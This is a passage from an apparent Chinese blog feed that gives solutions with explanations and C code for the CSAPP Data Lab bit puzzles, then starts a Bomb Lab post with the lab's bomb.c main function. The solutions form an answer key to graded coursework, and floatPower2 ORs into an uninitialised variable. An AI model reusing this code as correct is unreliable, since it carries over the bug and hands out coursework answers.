    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0xaaaaaaaa</span>
    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">^</span> mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>补码表示法的重要特性，取反加一即可。</p>
<h2 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">negate</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h1><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>这里我用了比较笨的逐位判断的方法。首先判断第 4 到第 31 位是否为 0x3，然后只需要关注低 4 位的二进制表示了：若第 3 位为 0，则一定位于指定范围之内，再加上两个特例（1000 和 1001）即可。</p>
<p>最后将运算符的个数刚好卡在 15 个，勉强过关。</p>
<h2 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isAsciiDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 0011 0000 &lt;= x &lt;= 0011 1001</span>
    <span class="token keyword">int</span> high <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 4 ~ 31 位是否为 0x3</span>
    <span class="token keyword">int</span> case1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x1</span><span class="token punctuation">;</span>   <span class="token comment">// bit3 = 0</span>
    <span class="token keyword">int</span> case2 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// bit0~3 = 1000</span>
    <span class="token keyword">int</span> case3 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// bit0~3 = 1001</span>
    <span class="token keyword">return</span> high <span class="token operator">&amp;</span> <span class="token punctuation">(</span>case1 <span class="token operator">|</span> case2 <span class="token operator">|</span> case3<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h1><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><p>很容易想到根据 x 的值是否非 0 构造出全 0 或者全 1 的数据 flag，然后将 flag 和 flag 取反后的值分别与 y 和 z 进行按位与，这样必然得到两个数：一个为 y 或 z 本身，另一个为 0，再将结果按位或即可。</p>
<p>构造的方法比较巧妙，需要注意到全 0 和全 1 分别代表整数 0 和 -1，它们分别是 0 和 1 的相反数，而 0 和 1 我们可以根据表达式是否非 0，使用非运算符构造出来，再将构造的结果取反加一即可。</p>
<h2 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">conditional</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">!</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token comment">// flag = x ? 0 : -1;</span>
    <span class="token keyword">int</span> yp <span class="token operator">=</span> <span class="token operator">~</span>flag <span class="token operator">&amp;</span> y<span class="token punctuation">;</span>       <span class="token comment">// flag = 0, yp = y; flag = -1, yp = 0;</span>
    <span class="token keyword">int</span> zp <span class="token operator">=</span> flag <span class="token operator">&amp;</span> z<span class="token punctuation">;</span>        <span class="token comment">// flag = 0, zp = 0; flag = -1, zp = z;</span>
    <span class="token keyword">return</span> yp <span class="token operator">|</span> zp<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h1><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><p>判断两个数的大小关系，很容易想到使用作差的方法，判断 <code>x + ~y + 1</code> 的结果是否小于等于 0，即全为 0 或者最高位为 1。</p>
<p>不过这里还需要考虑溢出：由于同号相减必定不会导致溢出，因此我们只需要考虑异号的情况。而如果两个数异号，那它们之间的大小关系就显而易见了。</p>
<h2 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isLessOrEqual</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> sign1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sign1 = (x &lt; 0 &amp;&amp; y > 0) ? 1 : 0;</span>
    <span class="token keyword">int</span> sign2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sign2 = (x > 0 &amp;&amp; y &lt; 0) ? 1 : 0;</span>
    <span class="token keyword">int</span> z <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token operator">~</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                             <span class="token comment">// z = x - y</span>
    <span class="token keyword">int</span> sub <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// z &lt;= 0    </span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>sub <span class="token operator">|</span> sign1<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span>sign2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h1><h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><p>这题从二进制位的角度不好思考，不妨从其表示的十进制数的角度出发：</p>
<p>当 x = 0 时，<code>-x = x</code> ，即 x 和 -x 的最高位相同，都为 0；当 x != 0 时，x 和 -x 的最高位必定有一个为 1。</p>
<p>可以利用这一特性将 <code>x | nx</code> 右移 31 位，由于整数进行的是符号右移，因此当最高位为 0 时，右移的结果全为 0，当最高位为 1 时，右移的结果全为 1。再将右移结果加 1，即可构造出 1 或者 0，且刚好与零和非零对应。</p>
<h2 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">logicalNeg</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> nx <span class="token operator">=</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">|</span> nx<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h1><h2 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h2><p>这题看到限制 90 个运算符就给吓着了，实际上也确实很困难，自己想了半天也没有思路，于是在网上参考了别人的解法，感觉相当精妙，在这里介绍一番：</p>
<p>对于正整数 x 而言，可以使用二分搜索的方式来确定所需的位数。首先判断 x 是否需要 16 位来表示，即 x 右移 16 位是否为 0，如果是，则右移 16 位，否则不做处理，然后再判断是否需要 8 位来处理，以此类推。最后将上述过程中的右移次数累加起来再加一（正整数首位需要为 0），即为总共需要的位数。</p>
<p>对于负整数 x 而言，它所需的位数与 x 取反得到的整数所需位数相同，证明没整明白。。。</p>
<h2 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">howManyBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> absx <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> x<span class="token punctuation">;</span>
    <span class="token keyword">int</span> b16<span class="token punctuation">,</span> b8<span class="token punctuation">,</span> b4<span class="token punctuation">,</span> b2<span class="token punctuation">,</span> b1<span class="token punctuation">,</span> b0<span class="token punctuation">;</span>

    <span class="token comment">// 二分搜索</span>
    b16 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>
    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b16<span class="token punctuation">;</span>
    b8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>
    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b8<span class="token punctuation">;</span>
    b4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span>
    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b4<span class="token punctuation">;</span>
    b2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>
    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b2<span class="token punctuation">;</span>
    b1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b1<span class="token punctuation">;</span>
    b0 <span class="token operator">=</span> absx<span class="token punctuation">;</span>

    <span class="token keyword">return</span> b16 <span class="token operator">+</span> b8 <span class="token operator">+</span> b4 <span class="token operator">+</span> b2 <span class="token operator">+</span> b1 <span class="token operator">+</span> b0 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h1><h2 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h2><p>这题主要是要对规格化数和非规格化数进行分类讨论：</p>
<p>当 uf 为规格化数，即阶码不为 0 时，乘二相当于将阶码位加 1。</p>
<p>当 uf 为非规格化数，即阶码为 0 时，此时 uf 的值完全由尾数来表示，且不含隐含 0，因此乘二相当于将尾数乘二，即左移 1 位。</p>
<p>需要注意的是，当 uf 为非规格化数且尾数最高位为 1 时，尾数左移会导致最高位的 1 移动到阶码的最低位。但经过验证，此时的结果仍然符合预期，即非规格化数无缝衔接到了规格化数，不禁感叹 IEEE 754 标准浮点数的设计之精妙。</p>
<h2 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">floatScale2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// 阶码</span>
    <span class="token keyword">unsigned</span> m <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>      <span class="token comment">// 尾数</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token keyword">return</span> uf<span class="token punctuation">;</span>        <span class="token comment">// 无穷大或者 NaN</span>
    <span class="token comment">// 非规格化数</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        m <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        uf <span class="token operator">&amp;=</span> <span class="token number">0xff800000</span><span class="token punctuation">;</span>
        uf <span class="token operator">|=</span> m<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 规格化数</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        t <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        uf <span class="token operator">&amp;=</span> <span class="token number">0x807fffff</span><span class="token punctuation">;</span>
        uf <span class="token operator">|=</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> uf<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h1><h2 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h2><p>首先确定整数所能表示的上下界的值：当阶码小于 127，即指数位小于 0 时，此时浮点数 uf 小于 1，对应的整数为 0；当阶码大于 150，即指数位大于 23 时，此时单精度浮点数的精度（尾数长度）不足以正确表示对应的整数，返回 0x80000000。</p>
<p>对于在合理范围内的 uf，将其转换为对应的整数，首先需要尾数最高位的高一位加上规格化数隐含的 1，再根据阶码的大小将尾数进行右移，阶码越大，右移位数越少。最后根据符号位的值选择是否将结果取反加一。</p>
<h2 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">floatFloat2Int</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> s <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">;</span>   <span class="token comment">// 符号</span>
    <span class="token keyword">unsigned</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// 阶码</span>
    <span class="token keyword">unsigned</span> m <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>      <span class="token comment">// 尾数</span>
    <span class="token keyword">int</span> val<span class="token punctuation">;</span>
    <span class="token comment">// 小于 1</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 大于 1 且不溢出</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;=</span> <span class="token number">150</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        val <span class="token operator">=</span> m <span class="token operator">|</span> <span class="token number">0x800000</span><span class="token punctuation">;</span>
        val <span class="token operator">>>=</span> <span class="token punctuation">(</span><span class="token number">23</span> <span class="token operator">-</span> <span class="token punctuation">(</span>t <span class="token operator">-</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            val <span class="token operator">=</span> <span class="token operator">~</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 溢出</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        val <span class="token operator">=</span> <span class="token number">0x80000000</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> val<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h1><h2 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h2><p>同样是对规格化数和非规格化数的分类讨论：</p>
<p>当 <code>x &gt;= -150 &amp;&amp; x &lt; -127</code> 时，结果为非规格化数，此时浮点数表示只有一个位为 1，其余全为 0。直接根据指数 x 的值确定该位的位置即可。</p>
<p>当 <code>x &gt;= -127 &amp;&amp; x &lt; 128</code> 时，结果为规格化数，此时浮点数表示的尾数全为 0，只有阶码用来表示指数的值。根据指数 x 的值确定阶码的值，然后构造出浮点数即可。</p>
<h2 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">floatPower2</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> val<span class="token punctuation">;</span>
    <span class="token comment">// 太小</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 非规格化数</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        val <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">150</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 规格化数</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">unsigned</span> t <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">127</span><span class="token punctuation">;</span>
        val <span class="token operator">|=</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 太大</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        val <span class="token operator">=</span> <span class="token number">0x7f800000</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> val<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>计算机基础</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP Bomb Lab</title>
    <url>/2024/09/17/CSAPP-Bomb-Lab/</url>
    <content><![CDATA[<span id="more"></span>

<p>本 Lab 可以说是 CSAPP 的几个 Lab 中最为人津津乐道的一个，对应知识点为书中的第 3 章（程序的机器级表示），要求使用 GDB 调试器，对汇编语言进行调试，从而得出正确的“拆弹密码”。共分为 6 个关卡和一个隐藏关卡，每个关卡都分别考察了一种语法结构或数据结构的汇编表示，部分关卡逻辑比较复杂，要求对 x86 汇编有一定的熟悉度。</p>
<h1 id="bomb-c"><a href="#bomb-c" class="headerlink" title="bomb.c"></a>bomb.c</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">;</span>

    <span class="token comment">/* Note to self: remember to port this bomb to Windows and put a
     * fantastic GUI on it. */</span>

    <span class="token comment">/* When run with no arguments, the bomb reads its input lines
     * from standard input. */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        infile <span class="token operator">=</span> <span class="token constant">stdin</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/* When run with one argument &lt;file>, the bomb reads from &lt;file>
     * until EOF, and then switches to standard input. Thus, as you
     * defuse each phase, you can add its defusing string to &lt;file> and
     * avoid having to retype it. */</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>infile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: Error: Couldn't open %s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/* You can't call the bomb with more than 1 command line argument. */</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s [&lt;input_file>]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span>
    <span class="token function">initialize_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"which to blow yourself up. Have a nice day!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Hmm...  Six phases must be more secure than one phase! */</span>
    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">/* Get input                   */</span>
    <span class="token function">phase_1</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">/* Run the phase               */</span>
    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">/* Drat!  They figured it out!
                                      * Let me know how they did it. */</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Phase 1 defused. How about the next one?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* The second phase is harder.  No one will ever figure out
     * how to defuse this... */</span>
    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">phase_2</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"That's number 2.  Keep going!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* I guess this is too easy so far.  Some more complex code will
     * confuse people. */</span>
    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">phase_3</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Halfway there!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span>
    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">phase_4</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
